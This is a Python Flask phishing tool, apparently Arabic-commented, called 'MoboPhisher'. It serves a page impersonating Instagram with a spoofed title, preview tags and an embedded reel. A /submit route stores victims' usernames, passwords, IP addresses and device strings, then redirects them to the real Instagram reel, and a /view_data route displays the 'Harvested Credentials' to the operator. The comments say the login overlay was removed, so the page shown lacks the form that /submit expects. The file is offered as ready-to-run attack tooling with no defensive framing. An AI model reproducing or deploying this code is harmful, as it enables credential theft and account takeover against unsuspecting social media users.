#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram
# تم حذف الطبقة السوداء (Overlay) وزر تسجيل الدخول
# الفيديو يظهر مباشرة بعد فتح الرابط

import os
import sys
import sqlite3
import socket
import threading
import requests
from flask import Flask, request, redirect, render_template_string
from uuid import uuid4
from datetime import datetime
from threading import Thread

app = Flask(__name__)
DB_NAME = "mobo_captures.db"

class MoboPhisher:
    def __init__(self):
        self.app = app
        self.setup_routes()
        self.cred_count = 0
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
        })
        self.init_db()
        self.base_url = self.get_base_url()

    def get_base_url(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return f"http://{ip}:8080"
        except:
            return "http://mobo33:8080"

    def init_db(self):
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("""CREATE TABLE IF NOT EXISTS harvest (
            id TEXT PRIMARY KEY,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        conn.commit()
        conn.close()

    def spoof_login_page(self):
        # هنا حينا الطبقة السوداء، الفيديو غادي يبان مباشرة
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <meta property="og:title" content="⚠️ هل ترفع صوت السماعا..." />
    <meta property="og:description" content="Laith Alfathi sur Instagram" />
    <meta property="og:image" content="https://i.imgur.com/your_thumbnail_image.jpg" />
    <meta property="og:video" content="https://www.instagram.com/reel/DcHCV27ilyM/embed/" />
    <meta property="og:type" content="video.other" />
    <meta property="og:url" content="https://instagram.com" />
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            overflow: hidden;
        }
        .video-container {
            position: relative;
            width: 100%;
            max-width: 400px;
            height: 600px;
            background: #000;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .video-iframe {
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0; left: 0;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <!-- الفيديو يبان مباشرة بلا أي طبقة سوداء -->
        <iframe class="video-iframe" src="https://www.instagram.com/reel/DcHCV27ilyM/embed/" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
    </div>
</body>
</html>"""

    def setup_routes(self):
        @app.route('/')
        def home():
            return self.spoof_login_page()
        
        @app.route('/submit', methods=['POST'])
        def submit():
            username = request.form.get('username')
            password = request.form.get('password')
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent')
            
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT INTO harvest (id, username, password, ip, user_agent) VALUES (?,?,?,?,?)",
                      (str(uuid4()), username, password, ip, user_agent))
            conn.commit()
            conn.close()
            return redirect("https://www.instagram.com/reel/DcHCV27ilyM/?stkn=MW9mNHhjOWV0YTB3eA==", code=302)
        
        @app.route('/view_data')
        def view_data():
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("SELECT * FROM harvest ORDER BY timestamp DESC")
            data = c.fetchall()
            conn.close()
            
            html = """<!DOCTYPE html>
<html>
<head>
    <title>@mobo33.3 Harvested Data</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background: #121212; 
            color: #e0e0e0; 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            overflow-x: auto;
        }
        h1 {
            text-align: center;
            background: linear-gradient(45deg, #833ab4, #fd1d1d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 30px;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #1e1e1e; 
            font-size: 14px;
        }
        th, td { 
            padding: 12px 15px; 
            border: 1px solid #333; 
            text-align: left; 
            word-break: break-all;
        }
        th { 
            background: #262626; 
            color: #fd1d1d; 
        }
        tr:nth-child(even) { 
            background: #1a1a1a; 
        }
        .back-btn {
            display: block; 
            width: 200px; 
            margin: 30px auto; 
            padding: 10px;
            background: linear-gradient(45deg, #833ab4, #fd1d1d); 
            color: white;
            text-align: center; 
            text-decoration: none;
            border-radius: 5px; 
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>@mobo33.3 Harvested Credentials</h1>
    <table>
        <tr>
            <th>ID</th>
            <th>Username</th>
            <th>Password</th>
            <th>IP</th>
            <th>Device</th>
            <th>Timestamp</th>
        </tr>"""
            
            for row in data:
                html += f"""
        <tr>
            <td>{row[0][:8]}...</td>
            <td>{row[1]}</td>
            <td><strong style="color:#00ff00">{row[2]}</strong></td>
            <td>{row[3]}</td>
            <td>{row[4][:50]}</td>
            <td>{row[5]}</td>
        </tr>"""
            
            html += """
    </table>
    <a href="/" class="back-btn">Back to Verification</a>
</body>
</html>"""
            return html

    def launch(self):
        port = int(os.environ.get('PORT', 8080))
        
        print("\n" + "="*50)
        print(f"[+] Server starting on port {port}...")
        print("="*50)
        
        app.run(host='0.0.0.0', port=port, threaded=True)

if __name__ == "__main__":
    phisher = MoboPhisher()
    phisher.launch()